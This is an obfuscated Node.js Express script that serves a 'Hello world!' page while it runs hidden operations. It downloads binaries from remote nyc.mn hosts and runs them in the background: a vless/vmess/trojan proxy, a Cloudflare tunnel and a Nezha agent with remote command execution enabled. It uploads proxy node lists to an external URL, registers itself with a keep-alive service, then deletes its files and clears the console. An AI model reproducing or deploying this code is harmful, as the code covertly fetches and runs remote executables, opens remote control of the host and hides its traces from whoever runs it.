function _0x2d7a(_0x4f3064,_0x57b2de){const _0x4b2113=_0x4b21();return _0x2d7a=function(_0x2d7ac8,_0x30312b){_0x2d7ac8=_0x2d7ac8-0x69;let _0x3771a7=_0x4b2113[_0x2d7ac8];return _0x3771a7;},_0x2d7a(_0x4f3064,_0x57b2de);}const _0x4c2c8d=_0x2d7a;(function(_0x46be4a,_0x4368cd){const _0x57fa7a=_0x2d7a,_0x4edafd=_0x46be4a();while(!![]){try{const _0x104cfa=parseInt(_0x57fa7a(0xf7))/0x1+parseInt(_0x57fa7a(0xf4))/0x2*(-parseInt(_0x57fa7a(0x90))/0x3)+-parseInt(_0x57fa7a(0x80))/0x4*(-parseInt(_0x57fa7a(0x6f))/0x5)+parseInt(_0x57fa7a(0x108))/0x6*(parseInt(_0x57fa7a(0x70))/0x7)+parseInt(_0x57fa7a(0x75))/0x8*(-parseInt(_0x57fa7a(0xcf))/0x9)+parseInt(_0x57fa7a(0xe2))/0xa+parseInt(_0x57fa7a(0xa7))/0xb*(-parseInt(_0x57fa7a(0x9f))/0xc);if(_0x104cfa===_0x4368cd)break;else _0x4edafd['push'](_0x4edafd['shift']());}catch(_0x15c71b){_0x4edafd['push'](_0x4edafd['shift']());}}}(_0x4b21,0xf0362));const express=require(_0x4c2c8d(0xc2)),app=express(),axios=require(_0x4c2c8d(0xe8)),os=require('os'),fs=require('fs'),path=require(_0x4c2c8d(0x71)),{promisify}=require('util'),exec=promisify(require(_0x4c2c8d(0xc5))[_0x4c2c8d(0x10d)]),{execSync}=require(_0x4c2c8d(0xc5)),UPLOAD_URL=process['env'][_0x4c2c8d(0xb8)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0x120)]||![],FILE_PATH=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0x124)]||_0x4c2c8d(0x10b),SUB_PATH=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0xbd)]||'sub',PORT=process['env'][_0x4c2c8d(0x6b)]||process[_0x4c2c8d(0xfe)][_0x4c2c8d(0x87)]||0xbb8,UUID=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0xba)]||'31577f7d-93b2-4b7e-902c-a6f4f3992bbd',NEZHA_SERVER=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0x76)]||'',NEZHA_PORT=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0xed)]||'',NEZHA_KEY=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0xf0)]||'',ARGO_DOMAIN=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0xec)]||'',ARGO_AUTH=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0x83)]||'',ARGO_PORT=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0x8f)]||0x1f41,CFIP=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0xf8)]||_0x4c2c8d(0x107),CFPORT=process['env'][_0x4c2c8d(0x77)]||0x1bb,NAME=process[_0x4c2c8d(0xfe)][_0x4c2c8d(0x74)]||_0x4c2c8d(0xad);!fs[_0x4c2c8d(0xee)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x4c2c8d(0xe3)](FILE_PATH+_0x4c2c8d(0x7a))):console['log'](FILE_PATH+'\x20already\x20exists');let npmPath=path[_0x4c2c8d(0xeb)](FILE_PATH,_0x4c2c8d(0xef)),phpPath=path[_0x4c2c8d(0xeb)](FILE_PATH,_0x4c2c8d(0xd9)),webPath=path[_0x4c2c8d(0xeb)](FILE_PATH,_0x4c2c8d(0xb2)),botPath=path[_0x4c2c8d(0xeb)](FILE_PATH,_0x4c2c8d(0xd0)),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x4c2c8d(0xeb)](FILE_PATH,_0x4c2c8d(0xd6)),bootLogPath=path[_0x4c2c8d(0xeb)](FILE_PATH,_0x4c2c8d(0x7e)),configPath=path['join'](FILE_PATH,_0x4c2c8d(0xff));function deleteNodes(){const _0x2fd0e6=_0x4c2c8d;try{if(!UPLOAD_URL)return;if(!fs[_0x2fd0e6(0xee)](subPath))return;let _0x37ffad;try{_0x37ffad=fs[_0x2fd0e6(0x7f)](subPath,'utf-8');}catch{return null;}const _0x38ffef=Buffer[_0x2fd0e6(0x9d)](_0x37ffad,'base64')[_0x2fd0e6(0xdc)](_0x2fd0e6(0xc9)),_0x57d699=_0x38ffef[_0x2fd0e6(0x10e)]('\x0a')[_0x2fd0e6(0x89)](_0x1355d1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2fd0e6(0x11a)](_0x1355d1));if(_0x57d699[_0x2fd0e6(0x97)]===0x0)return;return axios[_0x2fd0e6(0x94)](UPLOAD_URL+_0x2fd0e6(0x119),JSON[_0x2fd0e6(0x115)]({'nodes':_0x57d699}),{'headers':{'Content-Type':_0x2fd0e6(0x112)}})['catch'](_0x2274a1=>{return null;});}catch(_0x40c211){return null;}}function cleanupOldFiles(){const _0x10ea87=_0x4c2c8d,_0xbd8ef8=['web',_0x10ea87(0xd0),'npm',_0x10ea87(0xd9),_0x10ea87(0xb1),_0x10ea87(0x7e)];_0xbd8ef8[_0x10ea87(0xa1)](_0x1bcc30=>{const _0x354d46=_0x10ea87,_0x4018b6=path[_0x354d46(0xeb)](FILE_PATH,_0x1bcc30);fs[_0x354d46(0x110)](_0x4018b6,()=>{});});}app[_0x4c2c8d(0x11f)]('/',function(_0x240512,_0x1bc5d2){_0x1bc5d2['send']('Hello\x20world!');});const config={'log':{'access':_0x4c2c8d(0xce),'error':_0x4c2c8d(0xce),'loglevel':_0x4c2c8d(0xa3)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x4c2c8d(0x11c)}],'decryption':_0x4c2c8d(0xa3),'fallbacks':[{'dest':0xbb9},{'path':_0x4c2c8d(0xe6),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x4c2c8d(0x117),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x4c2c8d(0xf9),'protocol':_0x4c2c8d(0x99),'settings':{'clients':[{'id':UUID}],'decryption':_0x4c2c8d(0xa3)},'streamSettings':{'network':_0x4c2c8d(0xdf),'security':_0x4c2c8d(0xa3)}},{'port':0xbba,'listen':_0x4c2c8d(0xf9),'protocol':_0x4c2c8d(0x99),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4c2c8d(0xa3)},'streamSettings':{'network':'ws','security':_0x4c2c8d(0xa3),'wsSettings':{'path':_0x4c2c8d(0xe6)}},'sniffing':{'enabled':![],'destOverride':[_0x4c2c8d(0x8e),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x4c2c8d(0xae),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4c2c8d(0xb3)}},'sniffing':{'enabled':![],'destOverride':[_0x4c2c8d(0x8e),_0x4c2c8d(0xcb),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4c2c8d(0xf9),'protocol':_0x4c2c8d(0x10a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4c2c8d(0xa3),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':![],'destOverride':[_0x4c2c8d(0x8e),_0x4c2c8d(0xcb),_0x4c2c8d(0x103)],'metadataOnly':![]}}],'dns':{'servers':[_0x4c2c8d(0xb7)]},'outbounds':[{'protocol':_0x4c2c8d(0xe5),'tag':_0x4c2c8d(0xaf)},{'protocol':_0x4c2c8d(0x106),'tag':_0x4c2c8d(0xdd)}]};fs[_0x4c2c8d(0x102)](path[_0x4c2c8d(0xeb)](FILE_PATH,_0x4c2c8d(0xff)),JSON[_0x4c2c8d(0x115)](config,null,0x2));function _0x4b21(){const _0x5a38b9=['child_process','TunnelSecret','fileUrl','./php','utf-8','listen','tls','includes','\x0aclient_secret:\x20','/dev/null','12276LBpntw','bot','2087','?encryption=none&security=tls&sni=','\x0avless://','web\x20running\x20error:\x20','Error\x20downloading\x20files:','list.txt','tunnel.json','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','php','catch','./web','toString','block','arm','tcp','status','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','5864050WBXaoU','log','NEZHA\x20variable\x20is\x20empty,skip\x20running','freedom','/vless-argo','2096','axios','https://amd64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','join','ARGO_DOMAIN','NEZHA_PORT','existsSync','npm','NEZHA_KEY','ArgoDomain:','./npm','all','469006VrGhCx','\x0a\x20\x20credentials-file:\x20','false','1018718TdGhVB','CFIP','127.0.0.1','\x0a\x20\x20\x0avmess://','createWriteStream','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0a\x20\x20tunnel:\x20','env','config.json','Error\x20executing\x20command:\x20','ARGO_DOMAIN:','writeFileSync','quic','chmod','pipe','blackhole','www.visa.com.sg','132lgKnHS','2083','trojan','./tmp','fileName','exec','split','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','unlink','message','application/json','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','tunnel.yml','stringify','/php\x20-c\x20\x22','/trojan-argo','Download\x20','/api/delete-nodes','test','./bot','xtls-rprx-vision','web\x20is\x20running','set','get','AUTO_ACCESS','/tunnel.yml\x20run','Subscription\x20uploaded\x20successfully','trim','FILE_PATH','https://arm64.ssss.nyc.mn/v1','Content-Type','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','has','SERVER_PORT','https://amd64.ssss.nyc.mn/agent','then','aarch64','245865kcZTSI','215411kjPkAG','path','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','nohup\x20','NAME','2728iqLvjE','NEZHA_SERVER','CFPORT','base64','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20is\x20created','/sub.txt\x20saved\x20successfully','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20>/dev/null\x202>&1','boot.log','readFileSync','12NEwdKp','?security=tls&sni=','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','ARGO_AUTH','https://amd64.ssss.nyc.mn/web','443','push','PORT','arm64','filter','/web\x20-c\x20','\x20failed:\x20','send','error','http','ARGO_PORT','3PFEsvq','npm\x20running\x20error:\x20','2053','8443','post','automatic\x20access\x20task\x20added\x20successfully','php\x20running\x20error:\x20','length','bot\x20is\x20running','vless','match','Error\x20reading\x20boot.log:','https://oooo.serv00.net/add-url','from','pop','596892gGWLwx','\x20>/dev/null\x202>&1\x20&','forEach','--tls','none','finish','https://arm64.ssss.nyc.mn/agent','\x20-p\x20','165VgqZeH','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','stream','Empowerment\x20success\x20for\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','Vls','vmess','direct','/api/add-subscriptions','sub.txt','web','/vmess-argo','/npm\x20-s\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','arch','https+local://8.8.8.8/dns-query','UPLOAD_URL','config.yaml','UUID','&type=ws&host=','data','SUB_PATH','http\x20server\x20is\x20running\x20on\x20port:','/api/add-nodes','response','unshift','express','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'];_0x4b21=function(){return _0x5a38b9;};return _0x4b21();}function getSystemArchitecture(){const _0x1fc854=_0x4c2c8d,_0x5503dc=os[_0x1fc854(0xb6)]();return _0x5503dc===_0x1fc854(0xde)||_0x5503dc===_0x1fc854(0x88)||_0x5503dc===_0x1fc854(0x6e)?_0x1fc854(0xde):'amd';}function downloadFile(_0x24b950,_0x1fe5b7,_0x1a8fcb){const _0x2b302b=_0x4c2c8d,_0x4fa447=path[_0x2b302b(0xeb)](FILE_PATH,_0x24b950),_0xd5f8c9=fs[_0x2b302b(0xfb)](_0x4fa447);axios({'method':'get','url':_0x1fe5b7,'responseType':_0x2b302b(0xa9)})[_0x2b302b(0x6d)](_0x2ad0ba=>{const _0x59b3e7=_0x2b302b;_0x2ad0ba[_0x59b3e7(0xbc)][_0x59b3e7(0x105)](_0xd5f8c9),_0xd5f8c9['on'](_0x59b3e7(0xa4),()=>{const _0x280465=_0x59b3e7;_0xd5f8c9['close'](),console['log'](_0x280465(0x118)+_0x24b950+'\x20successfully'),_0x1a8fcb(null,_0x24b950);}),_0xd5f8c9['on']('error',_0x3ce04c=>{const _0x1b380b=_0x59b3e7;fs[_0x1b380b(0x110)](_0x4fa447,()=>{});const _0x20516d=_0x1b380b(0x118)+_0x24b950+_0x1b380b(0x8b)+_0x3ce04c['message'];console[_0x1b380b(0x8d)](_0x20516d),_0x1a8fcb(_0x20516d);});})[_0x2b302b(0xda)](_0x14ef78=>{const _0x2f9c80=_0x2b302b,_0x4792f6=_0x2f9c80(0x118)+_0x24b950+'\x20failed:\x20'+_0x14ef78[_0x2f9c80(0x111)];console[_0x2f9c80(0x8d)](_0x4792f6),_0x1a8fcb(_0x4792f6);});}async function downloadFilesAndRun(){const _0x588331=_0x4c2c8d,_0x4f82ac=getSystemArchitecture(),_0x4c619d=getFilesForArchitecture(_0x4f82ac);if(_0x4c619d['length']===0x0){console['log'](_0x588331(0x72));return;}const _0x3d91eb=_0x4c619d['map'](_0x403e02=>{return new Promise((_0x1809ab,_0x3bd9fc)=>{const _0x550bc2=_0x2d7a;downloadFile(_0x403e02[_0x550bc2(0x10c)],_0x403e02[_0x550bc2(0xc7)],(_0x1cb630,_0x8addc6)=>{_0x1cb630?_0x3bd9fc(_0x1cb630):_0x1809ab(_0x8addc6);});});});try{await Promise[_0x588331(0xf3)](_0x3d91eb);}catch(_0x5e6571){console[_0x588331(0x8d)](_0x588331(0xd5),_0x5e6571);return;}function _0x44d5ba(_0x3209a0){const _0x3cae95=_0x588331,_0x3a607b=0x1fd;_0x3209a0[_0x3cae95(0xa1)](_0x391118=>{const _0x103a6f=_0x3cae95,_0x380377=path[_0x103a6f(0xeb)](FILE_PATH,_0x391118);fs[_0x103a6f(0xee)](_0x380377)&&fs[_0x103a6f(0x104)](_0x380377,_0x3a607b,_0x3267ff=>{const _0x1e6887=_0x103a6f;_0x3267ff?console[_0x1e6887(0x8d)]('Empowerment\x20failed\x20for\x20'+_0x380377+':\x20'+_0x3267ff):console[_0x1e6887(0xe3)](_0x1e6887(0xaa)+_0x380377+':\x20'+_0x3a607b[_0x1e6887(0xdc)](0x8));});});}const _0x19215d=NEZHA_PORT?[_0x588331(0xf2),_0x588331(0xdb),_0x588331(0x11b)]:[_0x588331(0xc8),_0x588331(0xdb),_0x588331(0x11b)];_0x44d5ba(_0x19215d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1b09ca=NEZHA_SERVER[_0x588331(0xcc)](':')?NEZHA_SERVER[_0x588331(0x10e)](':')[_0x588331(0x9e)]():'',_0x1198f0=new Set(['443',_0x588331(0x93),'2096',_0x588331(0xd1),_0x588331(0x109),_0x588331(0x92)]),_0x2b252c=_0x1198f0[_0x588331(0x6a)](_0x1b09ca)?'true':_0x588331(0xf6),_0x4de685=_0x588331(0xcd)+NEZHA_KEY+_0x588331(0xc4)+NEZHA_SERVER+_0x588331(0xac)+_0x2b252c+_0x588331(0x7c)+UUID;fs[_0x588331(0x102)](path['join'](FILE_PATH,_0x588331(0xb9)),_0x4de685);const _0xcdc0e='nohup\x20'+FILE_PATH+_0x588331(0x116)+FILE_PATH+_0x588331(0xa8);try{await exec(_0xcdc0e),console[_0x588331(0xe3)]('php\x20is\x20running'),await new Promise(_0x56468d=>setTimeout(_0x56468d,0x3e8));}catch(_0x210d7e){console['error'](_0x588331(0x96)+_0x210d7e);}}else{let _0x284b17='';const _0x1de2ce=[_0x588331(0x85),_0x588331(0x93),_0x588331(0xe7),_0x588331(0xd1),_0x588331(0x109),_0x588331(0x92)];_0x1de2ce[_0x588331(0xcc)](NEZHA_PORT)&&(_0x284b17=_0x588331(0xa2));const _0x5ef0b8=_0x588331(0x73)+FILE_PATH+_0x588331(0xb4)+NEZHA_SERVER+':'+NEZHA_PORT+_0x588331(0xa6)+NEZHA_KEY+'\x20'+_0x284b17+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5ef0b8),console[_0x588331(0xe3)]('npm\x20is\x20running'),await new Promise(_0x58401e=>setTimeout(_0x58401e,0x3e8));}catch(_0x5690d4){console[_0x588331(0x8d)](_0x588331(0x91)+_0x5690d4);}}}else console[_0x588331(0xe3)](_0x588331(0xe4));const _0x5819c7=_0x588331(0x73)+FILE_PATH+_0x588331(0x8a)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5819c7),console['log'](_0x588331(0x11d)),await new Promise(_0x5c12e7=>setTimeout(_0x5c12e7,0x3e8));}catch(_0x38349a){console['error'](_0x588331(0xd4)+_0x38349a);}if(fs['existsSync'](path['join'](FILE_PATH,'bot'))){let _0x29e1d0;if(ARGO_AUTH[_0x588331(0x9a)](/^[A-Z0-9a-z=]{120,250}$/))_0x29e1d0=_0x588331(0x79)+ARGO_AUTH;else ARGO_AUTH[_0x588331(0x9a)](/TunnelSecret/)?_0x29e1d0=_0x588331(0xea)+FILE_PATH+_0x588331(0x121):_0x29e1d0='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x588331(0x10f)+ARGO_PORT;try{await exec('nohup\x20'+FILE_PATH+'/bot\x20'+_0x29e1d0+_0x588331(0xa0)),console[_0x588331(0xe3)](_0x588331(0x98)),await new Promise(_0x411c7b=>setTimeout(_0x411c7b,0x7d0));}catch(_0x12edcd){console[_0x588331(0x8d)]('Error\x20executing\x20command:\x20'+_0x12edcd);}}await new Promise(_0x307279=>setTimeout(_0x307279,0x1388));}function getFilesForArchitecture(_0x53ceac){const _0x41c28a=_0x4c2c8d;let _0x5139be;_0x53ceac===_0x41c28a(0xde)?_0x5139be=[{'fileName':_0x41c28a(0xb2),'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0x41c28a(0xd0),'fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x5139be=[{'fileName':'web','fileUrl':_0x41c28a(0x84)},{'fileName':'bot','fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5c363d=_0x53ceac===_0x41c28a(0xde)?_0x41c28a(0xa5):_0x41c28a(0x6c);_0x5139be[_0x41c28a(0xc1)]({'fileName':_0x41c28a(0xef),'fileUrl':_0x5c363d});}else{const _0x3e11a3=_0x53ceac===_0x41c28a(0xde)?_0x41c28a(0x125):_0x41c28a(0xe9);_0x5139be[_0x41c28a(0xc1)]({'fileName':_0x41c28a(0xd9),'fileUrl':_0x3e11a3});}}return _0x5139be;}function argoType(){const _0x3bfacd=_0x4c2c8d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3bfacd(0xe3)](_0x3bfacd(0x113));return;}if(ARGO_AUTH[_0x3bfacd(0xcc)](_0x3bfacd(0xc6))){fs[_0x3bfacd(0x102)](path[_0x3bfacd(0xeb)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x29f8b=_0x3bfacd(0xfd)+ARGO_AUTH['split']('\x22')[0xb]+_0x3bfacd(0xf5)+path[_0x3bfacd(0xeb)](FILE_PATH,_0x3bfacd(0xd7))+_0x3bfacd(0xfc)+ARGO_DOMAIN+_0x3bfacd(0xd8)+ARGO_PORT+_0x3bfacd(0xc3);fs[_0x3bfacd(0x102)](path[_0x3bfacd(0xeb)](FILE_PATH,_0x3bfacd(0x114)),_0x29f8b);}else console[_0x3bfacd(0xe3)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x324385=_0x4c2c8d;let _0x2a44b8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2a44b8=ARGO_DOMAIN,console[_0x324385(0xe3)](_0x324385(0x101),_0x2a44b8),await _0x427483(_0x2a44b8);else try{const _0xd5ec71=fs[_0x324385(0x7f)](path[_0x324385(0xeb)](FILE_PATH,_0x324385(0x7e)),_0x324385(0xc9)),_0x1dbcfb=_0xd5ec71[_0x324385(0x10e)]('\x0a'),_0x58c830=[];_0x1dbcfb[_0x324385(0xa1)](_0xa82fc8=>{const _0x463a16=_0x324385,_0x1da266=_0xa82fc8[_0x463a16(0x9a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1da266){const _0x181bcd=_0x1da266[0x1];_0x58c830[_0x463a16(0x86)](_0x181bcd);}});if(_0x58c830[_0x324385(0x97)]>0x0)_0x2a44b8=_0x58c830[0x0],console['log'](_0x324385(0xf1),_0x2a44b8),await _0x427483(_0x2a44b8);else{console[_0x324385(0xe3)](_0x324385(0x69)),fs['unlinkSync'](path[_0x324385(0xeb)](FILE_PATH,_0x324385(0x7e)));async function _0x59e319(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x56c042){}}_0x59e319(),await new Promise(_0x154ce6=>setTimeout(_0x154ce6,0xbb8));const _0x4ec131=_0x324385(0xe1)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+path[_0x324385(0xeb)](FILE_PATH,_0x324385(0xd0))+'\x20'+_0x4ec131+_0x324385(0xa0)),console[_0x324385(0xe3)]('bot\x20is\x20running.'),await new Promise(_0x4551a4=>setTimeout(_0x4551a4,0xbb8)),await extractDomains();}catch(_0x2159a4){console[_0x324385(0x8d)](_0x324385(0x100)+_0x2159a4);}}}catch(_0x34ac44){console[_0x324385(0x8d)](_0x324385(0x9b),_0x34ac44);}async function _0x427483(_0x116a9d){const _0x1fe7da=_0x324385,_0x5c0415=execSync(_0x1fe7da(0x82),{'encoding':_0x1fe7da(0xc9)}),_0x11e6a8=_0x5c0415[_0x1fe7da(0x123)]();return new Promise(_0x30b16b=>{setTimeout(()=>{const _0x4330c3=_0x2d7a,_0x51d4ca={'v':'2','ps':NAME+'-'+_0x11e6a8,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4330c3(0xa3),'net':'ws','type':'none','host':_0x116a9d,'path':'/vmess-argo?ed=2560','tls':_0x4330c3(0xcb),'sni':_0x116a9d,'alpn':''},_0x3f48aa=_0x4330c3(0xd3)+UUID+'@'+CFIP+':'+CFPORT+_0x4330c3(0xd2)+_0x116a9d+_0x4330c3(0xbb)+_0x116a9d+'&path=%2Fvless-argo%3Fed%3D2560#'+NAME+'-'+_0x11e6a8+_0x4330c3(0xfa)+Buffer['from'](JSON[_0x4330c3(0x115)](_0x51d4ca))[_0x4330c3(0xdc)](_0x4330c3(0x78))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x4330c3(0x81)+_0x116a9d+_0x4330c3(0xbb)+_0x116a9d+_0x4330c3(0xab)+NAME+'-'+_0x11e6a8+'\x0a\x20\x20\x20\x20';console['log'](Buffer['from'](_0x3f48aa)['toString'](_0x4330c3(0x78))),fs[_0x4330c3(0x102)](subPath,Buffer['from'](_0x3f48aa)[_0x4330c3(0xdc)](_0x4330c3(0x78))),console[_0x4330c3(0xe3)](FILE_PATH+_0x4330c3(0x7b)),uplodNodes(),app[_0x4330c3(0x11f)]('/'+SUB_PATH,(_0x504c07,_0x7811d6)=>{const _0x93ea7c=_0x4330c3,_0x1406d5=Buffer[_0x93ea7c(0x9d)](_0x3f48aa)[_0x93ea7c(0xdc)](_0x93ea7c(0x78));_0x7811d6[_0x93ea7c(0x11e)](_0x93ea7c(0x126),'text/plain;\x20charset=utf-8'),_0x7811d6[_0x93ea7c(0x8c)](_0x1406d5);}),_0x30b16b(_0x3f48aa);},0x7d0);});}}async function uplodNodes(){const _0x346bf5=_0x4c2c8d;if(UPLOAD_URL&&PROJECT_URL){const _0x1b9d37=PROJECT_URL+'/'+SUB_PATH,_0x1ac68e={'subscription':[_0x1b9d37]};try{const _0x194c34=await axios[_0x346bf5(0x94)](UPLOAD_URL+_0x346bf5(0xb0),_0x1ac68e,{'headers':{'Content-Type':_0x346bf5(0x112)}});if(_0x194c34[_0x346bf5(0xe0)]===0xc8)console[_0x346bf5(0xe3)](_0x346bf5(0x122));else return null;}catch(_0x14930d){if(_0x14930d[_0x346bf5(0xc0)]){if(_0x14930d[_0x346bf5(0xc0)][_0x346bf5(0xe0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x31fcc6=fs['readFileSync'](listPath,_0x346bf5(0xc9)),_0x2c0396=_0x31fcc6[_0x346bf5(0x10e)]('\x0a')[_0x346bf5(0x89)](_0x220bc8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x346bf5(0x11a)](_0x220bc8));if(_0x2c0396[_0x346bf5(0x97)]===0x0)return;const _0x1690c2=JSON[_0x346bf5(0x115)]({'nodes':_0x2c0396});try{await axios['post'](UPLOAD_URL+_0x346bf5(0xbf),_0x1690c2,{'headers':{'Content-Type':_0x346bf5(0x112)}});if(response['status']===0xc8)console[_0x346bf5(0xe3)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x58cb06){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x28b773=_0x2d7a,_0xceb9c9=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0xceb9c9[_0x28b773(0x86)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xceb9c9[_0x28b773(0x86)](phpPath);exec('rm\x20-rf\x20'+_0xceb9c9['join']('\x20')+_0x28b773(0x7d),_0x3773a8=>{const _0xbb74e9=_0x28b773;console['clear'](),console['log']('App\x20is\x20running'),console[_0xbb74e9(0xe3)](_0xbb74e9(0xb5));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x467617=_0x4c2c8d;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x4cc75c=await axios['post'](_0x467617(0x9c),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console[_0x467617(0xe3)](_0x467617(0x95));}catch(_0x731728){console[_0x467617(0x8d)]('添加URL失败:\x20'+_0x731728[_0x467617(0x111)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x4c2c8d(0xca)](PORT,()=>console['log'](_0x4c2c8d(0xbe)+PORT+'!'));
